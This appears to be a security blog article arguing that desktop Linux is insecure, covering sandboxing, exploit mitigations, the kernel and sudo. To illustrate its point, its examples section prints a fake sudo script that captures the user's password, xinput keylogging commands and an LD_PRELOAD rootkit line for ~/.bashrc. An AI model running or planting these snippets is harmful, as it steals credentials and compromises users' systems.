  <h1>Linux (In)security</h1>

  <p class="date"><i><time datetime="2021-03-12">Last edited: March 12, 2021</time></i></p>

  <p>
    Linux being secure is a common misconception in the security and privacy realm. Linux is thought to be secure primarily
    because of its source model, popular usage in servers, small userbase and confusion about its security features. This
    article is intended to debunk these misunderstandings. Due to inevitable pedanticism, "Linux" in this article refers
    to a standard desktop Linux or GNU/Linux distribution.
  </p>

  <h2 id="sandboxing"><a href="#sandboxing">Sandboxing</a></h2>

  <p>
    There is no strong sandboxing in the standard Linux desktop. This means that all applications have access to each other’s data
    and can snoop on your personal information. Linux still follows the <a
    href="https://theinvisiblethings.blogspot.com/2010/08/ms-dos-security-model.html">MS-DOS security model</a> — any malicious
    application you install or an RCE vulnerability in a benevolent application can result in the attacker instantly gaining
    access to your data. <br>
    <br>
    This is in contrast to other desktop operating systems such as macOS or Windows 10 which have already put considerable effort into
    sandboxing applications. macOS <a href="https://developer.apple.com/documentation/security/app_sandbox">requires that all applications
    are sandboxed</a>. Windows <a href="https://docs.microsoft.com/en-us/windows/uwp/security/intro-to-secure-windows-app-development#41-windows-app-model">
    automatically sandboxes UWP applications</a> and provides the <a
    href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-sandbox/windows-sandbox-overview">Windows Sandbox
    utility</a> for non-UWP applications.
  </p>

  <h3 id="flatpak"><a href="#flatpak">Flatpak</a></h3>

  <p>
    Flatpak aims to sandbox applications, but <a href="https://flatkill.org/">its sandboxing is very flawed</a>. It fully
    trusts the applications and allows them to specify their own policy. This means security is optional and apps can
    just choose not to be sufficiently sandboxed. <br>
    <br>
    Flatpak's permissions are also far too broad to be meaningful. For example, many applications come with
    <code>filesystem=home</code> which is read-write access to the user's home directory, giving access to all of your
    personal files and allowing trivial escapes via writing to <code>~/.bashrc</code> or similar. <br>
    <br>
    Another example of Flatpak's broad permissions is how it allows unfiltered access to the X11 socket, allowing easy
    escapes due to X11's lack of GUI isolation. Adding X11 sandboxing via a nested X11 server such as Xpra is easy but
    <a href="https://blogs.gnome.org/alexl/2015/02/17/first-fully-sandboxed-linux-desktop-app/">Flatpak developers refuse
    to acknowledge this and continue to claim, "X11 is impossible to secure"</a>. <br>
    <br>
    Even more examples of this is how Flatpak gives full access to directories such as <code>/sys</code> or
    <code>/proc</code> (kernel interfaces known for information leaks). <br>
    <br>
    <i>Another</i> example is how the seccomp filter <a
      href="https://github.com/flatpak/flatpak/blob/f687f6b2ebfe9bc69f59e42bb96475ca01f08548/common/flatpak-run.c#L2646-L2693">
    only blacklists ~20 syscalls</a> which still exposes significant kernel attack surface.
  </p>

  <h3 id="firejail"><a href="#firejail">Firejail</a></h3>

  <p>
    Firejail also aims to sandbox applications but is, again, uneffective. If anything, it worsens security by acting as a
    privilege escalation hole. Firejail requires being SUID root, meaning it executes with the privileges of the root user.
    This could be acceptable if Firejail followed good security practices but, unfortunately, they do not. Firejail has too
    large attack surface which has resulted in <a href="https://seclists.org/oss-sec/2017/q1/25">many</a> <a
    href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=16191&product_id=0&version_id=0&page=1">vulnerabilities</a>
    in the past. <a href="https://github.com/netblue30/firejail/issues/3046">There are more details in this thread</a>.
  </p>

  <h2 id="exploit-mitigations"><a href="#exploit-mitigations">Exploit Mitigations</a></h2>

  <p>
    Most programs on Linux  are written in memory unsafe languages such as C or C++
    which causes <a
    href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/">the majority of discovered security vulnerabilities</a>.
    Other operating systems have made more progress on adopting memory safe languages such as Windows which is <a
    href="https://msrc-blog.microsoft.com/2019/07/22/why-rust-for-safe-systems-programming/">leaning heavily towards Rust, a memory-safe language</a>. <br>
    <br>
    Modern exploit mitigations such as Control-Flow Integrity (CFI) are also not widely used unlike on alternative operating systems. These are
    just a few examples:
  </p>

  <ul>
    <li class="lilist">
      <a href="https://en.wikipedia.org/wiki/Control-flow_integrity">Control-Flow Integrity</a> is an exploit mitigation that <a
      href="https://blog.trailofbits.com/2016/10/17/lets-talk-about-cfi-clang-edition/">aims to prevent code reuse attacks like ROP or JOP</a>.
      A large portion of vulnerabilities are exploited using these techniques due to more widely adopted mitigations such as NX making older
      exploit techniques obsolete. On Linux, CFI is practically non-existent outside of Chromium whereas Windows has their own coarse-grained,
      forward-edge CFI implementation, <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a>
      (CFG) as well as <a
      href="https://techcommunity.microsoft.com/t5/windows-kernel-internals/understanding-hardware-enforced-stack-protection/ba-p/1247815">
      Intel CET shadow stacks for backward-edge protection</a>. While CFG is only coarse-grained, Microsoft are <a
      href="https://connormcgarr.github.io/examining-xfg/">working on making it more fine-grained</a>. <a
      href="https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf">M1 Macs also use Pointer Authentication
      Codes</a> (PAC) to ensure forward and backward-edge protection.
    </li>

    <li class="lilist">
      A very basic exploit technique is simply to find a way to execute the attackers own malicious code either by loading
      a malicious library on disk or by dynamically modifying executable code in memory. Linux has yet to provide strong mitigations
      against this while Windows has <a href="https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/">
      Arbitrary Code Guard and Code Integrity Guard</a> to enforce strict W^X and mitigate this avenue of attacks. macOS also has <a
      href="https://developer.apple.com/documentation/security/hardened_runtime">Hardened Runtime</a> for user space code and M1 Macs have
      <a href="https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf">Kernel Integrity Protection</a> (KIP)
      for kernel code. On Linux, SELinux does provide the <code>execmem</code> boolean however, this is rarely ever used. There is also the <a
      href="https://lore.kernel.org/lkml/1562410493-8661-1-git-send-email-s.mesoraca16@gmail.com/">S.A.R.A. LSM</a> but this is yet to
      be accepted upstream.
    </li>

    <li class="lilist">
      One of the most common memory corruption vulnerabilities is <a href="https://en.wikipedia.org/wiki/Uninitialized_variable">
      uninitialized memory</a>. Windows <a href="https://msrc-blog.microsoft.com/2020/05/13/solving-uninitialized-stack-memory-on-windows/">
      uses InitAll</a> to automatically initialize stack variables to zero for the kernel and some user space code, as well as <a
      href="https://msrc-blog.microsoft.com/2020/07/02/solving-uninitialized-kernel-pool-memory-on-windows/">safer APIs for the kernel pool</a>
      whereas on Linux, there are some mitigations for kernel memory specifically but this doesn't cover
      any user space code and good luck finding a mainstream distribution that actually enables them.
    </li>

    <li class="lilist">
      Windows supports <a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs">Virtualization-based Security</a>
      (VBS) which allows it to run the entire operating system inside of a virtual machine — this is used to enforce a number of security guarantees.
      One example of these is Hypervisor-Enforced Code Integrity (HVCI) which makes it significantly harder to inject malicious code into the kernel.
      Another example is <a
      href="https://www.microsoft.com/security/blog/2020/07/08/introducing-kernel-data-protection-a-new-platform-security-technology-for-preventing-data-corruption/">
      Kernel Data Protection</a> (KDP) — this prevents tampering with kernel data structures, making <a

      data-only attacks</a> more difficult. On Linux, there is no equivalent.
    </li>
  </ul>

  <h2 id="kernel"><a href="#kernel">Kernel</a></h2>

  <p>
    The kernel is also very lacking in security. It is a monolithic kernel, meaning it contains a colossal amount of code all within
    the most privileged part of the operating system. The kernel has huge attack surface and is constantly adding new and dangerous features.
    The Linux kernel is equivalent to running all user space code as root in PID 1. <br>
    <br>
    One example of these features is <a href="https://lwn.net/Articles/740157/">eBPF</a>. In a nutshell, eBPF is a framework within the
    Linux kernel that allows <i>unprivileged</i> user space to execute arbitrary code within the kernel for increased performance. eBPF
    also includes a JIT compiler which is fundamentally a W^X violation and opens up the possibility of JIT spraying. The kernel does perform
    a number of checks on the code that is executed but even then, this feature <a
    href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html">has</a> <a
    href="https://nitter.snopyta.org/spendergrsec/status/1244703091037024257">still</a> <a

    <a href="https://haxx.in/blasty-vs-ebpf.c">vulnerabilities</a>. <br>
    <br>
    Another example of these features is <a href="https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html">user namespaces</a>.
    User namespaces allow unprivileged users to interact with lots of kernel code that is normally reserved for the root user. It adds a
    massive amount of networking, mount, etc. functionality as new attack surface. It has also been the cause of <a
    href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043066.html">numerous</a> <a
    href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043078.html">privilege</a> <a
    href="https://github.com/a13xp0p0v/kconfig-hardened-check#questions-and-answers">escalation</a>
    <a href="https://github.com/subgraph/oz/issues/11#issuecomment-163396758">vulnerabilities</a> which is why many distributions <a
    href="https://salsa.debian.org/kernel-team/linux/-/blob/master/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch">
    such as Debian</a> have started to restrict it by default. The endless stream of vulnerabilities
    arising from this feature shows no sign of stopping either even after years since its introduction. <br>
    <br>
    The kernel is written entirely in a memory unsafe language and has hundreds of bugs, many being security vulnerabilities, <a
    href="https://events19.linuxfoundation.org/wp-content/uploads/2017/11/Syzbot-and-the-Tale-of-Thousand-Kernel-Bugs-Dmitry-Vyukov-Google.pdf">discovered
    each <i>month</i></a>. In fact, there are so many bugs being found in the kernel, developers can’t keep up which
    results in many of the bugs <a href="https://syzkaller.appspot.com/upstream">staying unfixed for a long time</a>.
    <a href="https://jon.oberheide.org/files/syscan12-exploitinglinux.pdf">The kernel is decades behind in exploit
    mitigations</a> and many kernel developers simply <a
    href="https://www.washingtonpost.com/sf/business/2015/11/05/net-of-insecurity-the-kernel-of-the-argument/">do not
    care enough</a>. <br>
    <br>
    Other kernels such as the  Windows and macOS kernels are somewhat similar too in that they are also large and bloated monolithic kernels with huge
    attack surface but they at least realise that these issues exist and take further steps to mitigate them.

  <h2 id="root"><a href="#root">The Non-Existent Boundary of Root</a></h2>

  <p>
    On ordinary desktops, <a
    href="https://www.whonix.org/wiki/Dev/Strong_Linux_User_Account_Isolation">a compromised non-root user account with access
    to <code>sudo</code> is almost equal to full root compromise</a> as there are too many ways for an attacker to retrieve the
    sudo password. Usually, the standard user is part of group <code>sudo</code> which makes this a massive issue and makes a
    sudo password security theater. For example, the attacker can exploit the plethora of keylogging opportunities such as <a
      href="https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">Xorg’s lack of GUI
      isolation</a>, the <a href="https://www.openwall.com/lists/oss-security/2011/11/05/3">many infoleaks in
      <code>/proc</code></a>, using <a href="https://github.com/Aishou/wayland-keylogger"><code>LD_PRELOAD</code> to hook
      into every process</a> and so much more. Even if we mitigate every single way to log keystrokes, the attacker can
    just setup their own fake sudo program to grab the user password.
  </p>

  <h2 id="examples"><a href="#examples">Examples</a></h2>

  <p>
    This is all it takes to get your <code>sudo</code> password:
  </p>

  <pre><code>cat &lt;&lt;\EOF > /tmp/sudo
#!/bin/bash
if [[ "${@}" = "" ]]; then
  /usr/bin/sudo
else
  read -s -r -p "[sudo] password for ${USER}: " password
  echo "${password}" > /tmp/password
  echo -e "\nSorry, try again."
  /usr/bin/sudo ${@}
fi
EOF
chmod +x /tmp/sudo
export PATH="/tmp:${PATH}"</code></pre>

  <p>
    Or:
  </p>

  <pre><code>xinput list # find your keyboard ID
xinput test id # replace "id" with the ID from the above command</code></pre>

  <p>
    etc. <br>
    <br>
    Now the attacker is just a <code>modprobe</code> away from full kernel privileges. <br>
    <br>
    An attacker can also trivially setup a session-wide rootkit via <code>LD_PRELOAD</code> or similar variables:
  </p>

  <pre><code>echo "LD_PRELOAD=\"/path/to/malicious_library\"" >> ~/.bashrc</code></pre>

  <p>
    This technique is quite common and is used in the majority of user space rootkits. A few examples are <a
    href="https://github.com/chokepoint/azazel">azazel</a>, <a href="https://github.com/chokepoint/Jynx2">Jynx2</a>
    and <a href="https://www.intezer.com/blog/linux/hiddenwasp-malware-targeting-linux-systems/">HiddenWasp</a>. <br>
    <br>
    These are just a few examples and they don't even require exploiting bugs.
  </p>

  <h2 id="distro-specific-issues"><a href="#distro-specific-issues">Distribution-Specific Issues</a></h2>

  <h3 id="debian"><a href="#debian">Debian, Ubuntu, RHEL, CentOS</a></h3>

  <p>
    Debian, among other distributions such as Ubuntu that freeze packages for a long time only ever backport security fixes
    that receive a CVE. However, this misses the majority of them. Most fixes do not receive CVEs because either the developer
    doesn’t care or because it’s not obvious whether or not a bug is exploitable at first. <br>
    <br>
    Debian maintainers cannot analyze every single commit perfectly and backport every security fix. They have to rely on CVEs
    which people do not use properly. <br>
    <br>
    For example, the Linux kernel <a href="https://github.com/gregkh/presentation-cve-is-dead/blob/master/cve-linux-kernel.pdf">
    is</a> <a href="https://grsecurity.net/reports_of_cves_death_greatly_exaggerated">particularly</a> <a
    href="https://blog.frizn.fr/linux-kernel/cve-2020-14381">bad</a> <a href="https://seclists.org/oss-sec/2019/q2/165">at this</a>.
    Even when there is a CVE for the issue, sometimes fixes still aren't backported such as in the Debian Chromium package which is <a
    href="https://forums.whonix.org/t/chromium-browser-for-kicksecure-discussions-not-whonix/10388/49">still affected by many severe
    and public vulnerabilities, some of which are even being exploited in the wild</a>.
  </p>

  <h2 id="hardening"><a href="#hardening">"But I harden my system!"</a></h2>

  <p>
    Standard system hardening is not enough to fix any of these massive architectural security issues. Restricting a few
    minor things is not going to fix this. Likewise, a few common security features distributions deploy by default is also
    not going to fix this. Just because your distribution enables a MAC framework without creating a strict policy and still
    running most processes unconfined, doesn't mean you can escape from these. <br>
    <br>
    The hardening required for a reasonably secure Linux distribution is far greater than people assume. You will need full
    system MAC policies, full verified boot (not just the kernel but the entire base system), a strong sandboxing
    architecture, a hardened kernel, widespread use of modern exploit mitigations and plenty more.
